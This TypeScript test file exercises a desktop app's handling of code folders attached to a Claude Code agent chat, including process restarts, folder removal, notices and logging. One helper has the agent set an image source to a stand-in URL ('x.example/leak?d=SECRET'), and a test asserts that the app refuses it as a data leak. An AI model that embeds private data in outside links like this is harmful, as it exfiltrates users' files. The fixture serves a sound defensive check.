// The Claude Code store with code folders, driven end to end in node: a
// stand-in for the desktop app's IPC answers the commands Rust would, and
// plays the process's output back through the same event. What is checked is
// what reaches Rust: the folders a process is started with, the restart when
// they change, the line that tells the agent, and the folder Rust forgets.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  SESSION,
  answers,
  callsTo,
  defaults,
  endTurn,
  lastStart,
  marbly,
  operations,
  play,
  resetAnswers,
  rows,
  sentTexts,
  settle,
  web,
} from './helpers/claudeDesktop';
import { claudeAgent } from '@/lib/claudeCode/store';
import { FOLDER_CAP_NOTICE, FOLDERS_CHANGED_NOTE, FOLDERS_REMOVED_NOTE } from '@/lib/claudeCode/folders';
import { buildFirstRunBrief } from '@/lib/claudeCode/prompt';
import { toAgentPanelView } from '@/lib/claudeCode/view';
import type { AgentFolder } from '@/lib/claudeCode/types';
import { WEB_LINKS_OFF, handleMcpMessage, type McpDesignApi } from '@/lib/mcp/desktopMcpServer';

const snap = () => claudeAgent.getSnapshot();
const view = () => toAgentPanelView(snap(), null);

/** The design api the layout hands the MCP server, as far as the web-link check reads it. */
const storeApi = new Proxy({} as McpDesignApi, {
  get: (_target, key) => {
    if (key === 'agentReadsFolders') return () => claudeAgent.agentReadsFolders();
    if (key === 'agentMayHoldFolderData') return () => claudeAgent.agentMayHoldFolderData();
    return () => true;
  },
});

/** The agent's update_element with a web picture in it, refused or not. */
async function agentSendsWebLink(): Promise<boolean> {
  const response = (await handleMcpMessage(
    {
      jsonrpc: '2.0',
      id: 1,
      method: 'tools/call',
      params: { name: 'update_element', arguments: { elementId: 'el_1', imageSrc: 'https://x.example/leak?d=SECRET' } },
    },
    storeApi,
    { agent: true }
  )) as { result?: { isError?: boolean; content?: Array<{ text?: string }> } };
  return response.result?.isError === true && response.result.content?.[0]?.text === WEB_LINKS_OFF;
}

test('a folder added mid-chat restarts the process with it, and a removal ends access at once', async () => {
  claudeAgent.subscribe(() => {});
  await claudeAgent.newChat({ projectId: 'p1', projectName: 'Marbly screenshots' });

  await claudeAgent.send({ text: 'Make it dark' });
  // No folders: the start is the same as before folders existed.
  assert.equal('folders' in lastStart(), false);
  endTurn('r1');
  assert.equal(snap().session.status, 'ready');
  assert.equal(snap().foldersLive, false);

  const pick = await claudeAgent.pickFolder({ addToChat: true });
  assert.deepEqual(pick, { kind: 'picked', folder: marbly });
  assert.deepEqual(snap().chat.folders, [marbly]);
  assert.equal(snap().folderPicking, false);
  assert.equal(snap().foldersPending, true, 'the new folder is not read yet');
  assert.equal(claudeAgent.agentReadsFolders(), false, 'the running process was started without it');

  await claudeAgent.send({ text: 'Use the folder I added' });
  assert.equal(callsTo('abs_claude_start').length, 2, 'restarted for the folder');
  assert.equal(callsTo('abs_claude_stop').length, 1);
  assert.deepEqual(lastStart().folders, [marbly.path]);
  assert.equal(lastStart().resume, SESSION);
  assert.ok(sentTexts().at(-1)!.startsWith(`${FOLDERS_CHANGED_NOTE}\n\nUse the folder I added`));
  assert.equal(claudeAgent.agentReadsFolders(), true);
  assert.equal(snap().foldersLive, true);
  assert.equal(snap().foldersPending, false);
  endTurn('r2');

  // Another message with the same folders goes to the same process, with no line.
  await claudeAgent.send({ text: 'Bigger headline' });
  assert.equal(callsTo('abs_claude_start').length, 2);
  assert.equal(sentTexts().at(-1), 'Bigger headline');
  endTurn('r3');

  // Removing it stops the idle process now and takes it off Rust's list.
  assert.equal(await claudeAgent.removeFolder(marbly.path), true);
  assert.deepEqual(snap().chat.folders, []);
  assert.equal(callsTo('abs_claude_stop').length, 2);
  assert.equal(snap().session.status, 'stopped');
  assert.equal(claudeAgent.agentReadsFolders(), false);
  assert.deepEqual(callsTo('abs_claude_forget_folder').map((entry) => entry.args.path), [marbly.path]);

  // The next message starts without it and says so.
  await claudeAgent.send({ text: 'Carry on' });
  assert.equal('folders' in lastStart(), false);
  assert.ok(sentTexts().at(-1)!.startsWith(`${FOLDERS_REMOVED_NOTE}\n\nCarry on`));
  endTurn('r4');
});

test('a folder removal waits while the agent works', async () => {
  await claudeAgent.newChat({ projectId: 'p1', projectName: 'Marbly screenshots' }, { folders: [marbly] });
  await claudeAgent.send({ text: 'Go' });
  assert.equal(snap().session.status, 'working');
  assert.equal(await claudeAgent.removeFolder(marbly.path), false);
  assert.deepEqual(snap().chat.folders, [marbly]);
  endTurn('w1');
});

test('a first message with folders starts with them and carries no change line', async () => {
  await claudeAgent.newChat({ projectId: 'p2', projectName: 'Web screenshots' }, { folders: [web, marbly, web] });
  // One per path.
  assert.deepEqual(snap().chat.folders, [web, marbly]);
  await claudeAgent.send({ text: 'Design my set', preface: 'Brief' });
  // Sorted, so the same set always makes the same system prompt.
  assert.deepEqual(lastStart().folders, [marbly.path, web.path]);
  assert.equal(lastStart().resume, undefined);
  assert.equal(sentTexts().at(-1), 'Brief\n\nDesign my set');
  endTurn('f1');
});

test('a folder Rust will not start with leaves the chat, with a word in the transcript', async () => {
  const gone = { name: 'Old app', path: '/Users/me/code/old-app' };
  answers.abs_claude_start = () => ({ pid: 1, workspace: '/agent/session', mcpUrl: 'x', missingFolders: [gone.path] });
  const forgotten = callsTo('abs_claude_forget_folder').length;
  await claudeAgent.newChat({ projectId: 'p3', projectName: 'P3' }, { folders: [marbly, gone] });
  await claudeAgent.send({ text: 'Go' });
  assert.deepEqual(lastStart().folders, [marbly.path, gone.path]);
  assert.deepEqual(snap().chat.folders, [marbly]);
  const notice = snap().session.items.find((item) => item.kind === 'notice' && item.tone === 'warning');
  assert.equal(
    notice?.kind === 'notice' && notice.text,
    'The agent can no longer read the Old app folder. Add it again if you still want it used'
  );
  assert.equal(claudeAgent.agentReadsFolders(), true, 'the one Rust granted is readable');
  endTurn('m1');
  // The dropped folder goes off Rust's list too, since no chat holds it.
  await settle();
  assert.deepEqual(callsTo('abs_claude_forget_folder').slice(forgotten).map((entry) => entry.args.path), [gone.path]);
  // And the next message to that process needs no restart.
  const starts = callsTo('abs_claude_start').length;
  await claudeAgent.send({ text: 'Again' });
  assert.equal(callsTo('abs_claude_start').length, starts);
  endTurn('m2');
  resetAnswers();
});

test('a first-run brief names only the folders Rust granted', async () => {
  const gone = { name: 'Old app', path: '/Users/me/code/old-app' };
  const brief = (folders: AgentFolder[]) => buildFirstRunBrief({ projectName: 'P9', artboard: null, screenshots: [], folders });
  const asked: string[][] = [];

  // The start-screen folder was moved before Start, so Rust starts without it.
  answers.abs_claude_start = () => ({ pid: 1, workspace: '/agent/session', mcpUrl: 'x', missingFolders: [gone.path] });
  await claudeAgent.newChat({ projectId: 'p9', projectName: 'P9' }, { folders: [gone] });
  await claudeAgent.send({
    text: 'Design store screenshots for my app from its code folder',
    preface: (granted) => {
      asked.push(granted.map((folder) => folder.path));
      return brief(granted);
    },
    skipContext: true,
  });
  assert.deepEqual(asked, [[]]);
  const refusedText = sentTexts().at(-1)!;
  assert.ok(refusedText.startsWith(brief([])), 'the plain brief, with no folder in it');
  assert.equal(refusedText.includes('Old app'), false);
  assert.equal(snap().chat.readFolders, false, 'a process that could read no folder read none');
  endTurn('b1');
  resetAnswers();

  // A folder Rust granted is named, and sends the agent there for screenshots.
  await claudeAgent.newChat({ projectId: 'p9', projectName: 'P9' }, { folders: [marbly] });
  await claudeAgent.send({ text: 'Go', preface: (granted) => brief(granted), skipContext: true });
  const grantedText = sentTexts().at(-1)!;
  assert.ok(grantedText.includes('The user also attached their app folder (Marbly).'));
  assert.ok(grantedText.includes("No screenshots were uploaded, but the user's app folder is attached."));
  endTurn('b2');
});

test('a folder change line that never went out goes with the next message', async () => {
  await claudeAgent.newChat({ projectId: 'p8', projectName: 'P8' });
  await claudeAgent.send({ text: 'First' });
  endTurn('l1');
  await claudeAgent.pickFolder({ addToChat: true });
  assert.equal(snap().foldersPending, true);

  // Stop lands while the process restarts for the folder, so nothing goes out.
  let release: () => void = () => {};
  answers.abs_claude_start = (args) =>
    new Promise((resolve) => {
      release = () => resolve(defaults.abs_claude_start(args));
    });
  const stopped = claudeAgent.send({ text: 'Now go' });
  await settle();
  await claudeAgent.stop();
  release();
  await stopped;
  resetAnswers();
  assert.equal(sentTexts().at(-1), 'First', 'the stopped message never went out');
  assert.equal(snap().foldersPending, true, 'and the folder is still news to the agent');

  await claudeAgent.send({ text: 'Again' });
  assert.ok(sentTexts().at(-1)!.startsWith(`${FOLDERS_CHANGED_NOTE}\n\nAgain`));
  assert.equal(snap().foldersPending, false);
  endTurn('l2');

  // The same when the write fails after a restart for a second folder.
  answers.abs_claude_pick_folder = () => web;
  await claudeAgent.pickFolder({ addToChat: true });
  answers.abs_claude_send = (args) => {
    if (JSON.parse(String(args.line)).type === 'user') throw 'The process went away';
    return null;
  };
  await claudeAgent.send({ text: 'Lost' });
  resetAnswers();
  assert.equal(snap().foldersPending, true);
  await claudeAgent.send({ text: 'Found' });
  assert.ok(sentTexts().at(-1)!.startsWith(`${FOLDERS_CHANGED_NOTE}\n\nFound`));
  endTurn('l3');
});

test('a chat whose agent read a folder keeps web links off and links as text after the folder goes', async () => {
  await claudeAgent.newChat({ projectId: 'p7', projectName: 'P7' }, { folders: [marbly] });
  assert.equal(snap().chat.readFolders, false, 'a new chat has read nothing');
  assert.equal(view().linksAsText, false);
  await claudeAgent.send({ text: 'Read my app' });
  play({ type: 'assistant', uuid: 'a7', message: { id: 'm7', content: [{ type: 'text', text: '[the docs](https://x.example/?d=1)' }] } });
  endTurn('s1');
  assert.equal(snap().chat.readFolders, true);
  assert.equal(await agentSendsWebLink(), true);

  // Removing the folder ends the process, but the conversation resumes with
  // every file it read still in it.
  assert.equal(await claudeAgent.removeFolder(marbly.path), true);
  assert.equal(claudeAgent.agentReadsFolders(), false);
  assert.equal(claudeAgent.agentMayHoldFolderData(), true);
  assert.equal(view().linksAsText, true);
  await claudeAgent.send({ text: 'Carry on' });
  assert.equal('folders' in lastStart(), false);
  assert.equal(lastStart().resume, SESSION);
  assert.equal(await agentSendsWebLink(), true, 'refused with no folder attached any more');
  endTurn('s2');

  // Saved with the chat, so Past chats brings it back with the chat.
  const chatId = snap().chat.id!;
  await claudeAgent.newChat({ projectId: 'p7', projectName: 'P7' });
  assert.equal(rows.get(chatId)?.readFolders, true);
  assert.equal(claudeAgent.agentMayHoldFolderData(), false, 'a new chat starts clean');
  assert.equal(view().linksAsText, false);
  assert.equal(await agentSendsWebLink(), false);
  assert.equal(await claudeAgent.openChat(chatId), true);
  assert.equal(claudeAgent.agentMayHoldFolderData(), true);
  assert.equal(view().linksAsText, true);
  assert.equal(await agentSendsWebLink(), true);
});

test('a past chat comes back with its folders, and deleting it lets Rust forget them', async () => {
  const kept = { name: 'Kept', path: '/Users/me/code/kept' };
  await claudeAgent.newChat({ projectId: 'p6', projectName: 'P6' }, { folders: [kept] });
  await claudeAgent.send({ text: 'Remember this chat' });
  endTurn('k1');
  const chatId = snap().chat.id!;
  // Leaving a chat saves it, folders and all.
  await claudeAgent.newChat({ projectId: 'p6', projectName: 'P6' });
  assert.deepEqual(rows.get(chatId)?.folders, [kept]);
  assert.deepEqual(rows.get(chatId)?.ranFolders, [kept.path]);
  assert.deepEqual(snap().chat.folders, [], 'a new chat from somewhere else starts without');

  assert.equal(await claudeAgent.openChat(chatId), true);
  assert.deepEqual(snap().chat.folders, [kept]);
  // It ran with that folder: nothing in it is new, so Send needs words.
  assert.equal(snap().foldersPending, false);

  await claudeAgent.newChat({ projectId: 'p6', projectName: 'P6' });
  const forgotten = callsTo('abs_claude_forget_folder').length;
  await claudeAgent.deleteChat(chatId);
  assert.deepEqual(callsTo('abs_claude_forget_folder').slice(forgotten).map((entry) => entry.args.path), [kept.path]);
});

test('a folder added to a reopened chat is new to it, and its message says so', async () => {
  const shop = { name: 'Shop', path: '/Users/me/code/shop' };
  const extra = { name: 'Extra', path: '/Users/me/code/extra' };
  await claudeAgent.newChat({ projectId: 'p11', projectName: 'P11' }, { folders: [shop] });
  await claudeAgent.send({ text: 'Start the set' });
  endTurn('o1');
  const chatId = snap().chat.id!;
  await claudeAgent.newChat({ projectId: 'p11', projectName: 'P11' });
  assert.equal(await claudeAgent.openChat(chatId), true);
  assert.equal(snap().foldersPending, false);

  answers.abs_claude_pick_folder = () => extra;
  assert.deepEqual(await claudeAgent.pickFolder({ addToChat: true }), { kind: 'picked', folder: extra });
  resetAnswers();
  assert.equal(snap().foldersPending, true);
  await claudeAgent.send({ text: 'Use the folder I added' });
  assert.deepEqual(lastStart().folders, [extra.path, shop.path]);
  assert.equal(lastStart().resume, SESSION);
  assert.ok(sentTexts().at(-1)!.startsWith(`${FOLDERS_CHANGED_NOTE}\n\nUse the folder I added`));
  endTurn('o2');
});

test('picking a folder the chat already has says so', async () => {
  await claudeAgent.newChat({ projectId: 'p10', projectName: 'P10' }, { folders: [marbly] });
  const again = await claudeAgent.pickFolder({ addToChat: true });
  assert.deepEqual(again, { kind: 'refused', message: 'Marbly is already added' });
  assert.equal(snap().folderNotice, 'Marbly is already added');
  assert.deepEqual(snap().chat.folders, [marbly]);
});

test('the run log keeps only the start of what a file tool returned', async () => {
  await claudeAgent.newChat({ projectId: 'p12', projectName: 'P12' }, { folders: [marbly] });
  await claudeAgent.send({ text: 'Read the README' });
  const source = 'x'.repeat(10_000);
  play({
    type: 'assistant',
    uuid: 'a12',
    message: {
      id: 'm12',
      content: [
        { type: 'tool_use', id: 'r1', name: 'Read', input: { file_path: `${marbly.path}/README.md` } },
        { type: 'tool_use', id: 'g1', name: 'Grep', input: { pattern: 'CFBundleDisplayName', output_mode: 'content' } },
        { type: 'tool_use', id: 'e1', name: 'mcp__osg-editor__list_artboards', input: {} },
      ],
    },
  });
  play({
    type: 'user',
    uuid: 'u12',
    message: {
      content: [
        { type: 'tool_result', tool_use_id: 'r1', content: [{ type: 'text', text: source }] },
        // Grep answers with a bare string.
        { type: 'tool_result', tool_use_id: 'g1', content: `ios/Info.plist:${source}` },
        { type: 'tool_result', tool_use_id: 'e1', content: [{ type: 'text', text: source }] },
      ],
    },
  });
  endTurn('t12');
  await settle();
  const run = [...operations.values()].find((operation) => operation.instruction === 'Read the README');
  assert.ok(run, 'the turn was logged');
  const results = run.entries.filter((entry) => entry.label === 'Tool result').map((entry) => entry.detail ?? '');
  assert.equal(results.length, 3);
  // The start of each file tool's answer, cut by clipText, which adds one ellipsis.
  assert.equal(results[0], `${source.slice(0, 2000)}…`, `a Read result kept ${results[0].length} characters`);
  assert.equal(results[1], `ios/Info.plist:${source}`.slice(0, 2000) + '…', `a Grep result kept ${results[1].length} characters`);
  assert.equal(results[2], source, "a design tool's answer is kept whole");
});

test('the picker refuses past the cap, reports Rust refusing, and never lands in another chat', async () => {
  await claudeAgent.newChat({ projectId: 'p4', projectName: 'P4' }, {
    folders: [marbly, web, { name: 'third', path: '/Users/me/code/third' }],
  });
  const picks = callsTo('abs_claude_pick_folder').length;
  assert.deepEqual(await claudeAgent.pickFolder({ addToChat: true }), { kind: 'refused', message: FOLDER_CAP_NOTICE });
  assert.equal(callsTo('abs_claude_pick_folder').length, picks, 'no dialog opens at the cap');
  assert.equal(snap().folderNotice, FOLDER_CAP_NOTICE);

  await claudeAgent.newChat({ projectId: 'p4', projectName: 'P4' });
  assert.equal(snap().folderNotice, null);
  answers.abs_claude_pick_folder = () => {
    throw 'That is a whole drive. Pick your app\'s own folder';
  };
  const refused = await claudeAgent.pickFolder({ addToChat: true });
  assert.deepEqual(refused, { kind: 'refused', message: "That is a whole drive. Pick your app's own folder" });
  assert.equal(snap().folderNotice, "That is a whole drive. Pick your app's own folder");
  assert.equal(snap().folderPicking, false);

  // The start screen asks without adding, and a refusal there stays out of the panel's line.
  await claudeAgent.newChat({ projectId: 'p4', projectName: 'P4' });
  const fromStartScreen = await claudeAgent.pickFolder();
  assert.equal(fromStartScreen.kind, 'refused');
  assert.equal(snap().folderNotice, null);

  // A chat that changes while the dialog is open never gets the folder.
  let release: (folder: typeof marbly) => void = () => {};
  answers.abs_claude_pick_folder = () => new Promise((resolve) => (release = resolve));
  const pending = claudeAgent.pickFolder({ addToChat: true, near: 'agent' });
  await new Promise((resolve) => setTimeout(resolve, 0));
  assert.equal(snap().folderPicking, true);
  assert.deepEqual(callsTo('abs_claude_pick_folder').at(-1)!.args, { near: 'agent' });
  // A second click while it is open does not open another.
  assert.equal((await claudeAgent.pickFolder({ addToChat: true })).kind, 'refused');
  await claudeAgent.newChat({ projectId: 'p5', projectName: 'P5' });
  release(marbly);
  assert.deepEqual(await pending, { kind: 'cancelled' });
  assert.deepEqual(snap().chat.folders, []);
  resetAnswers();
});
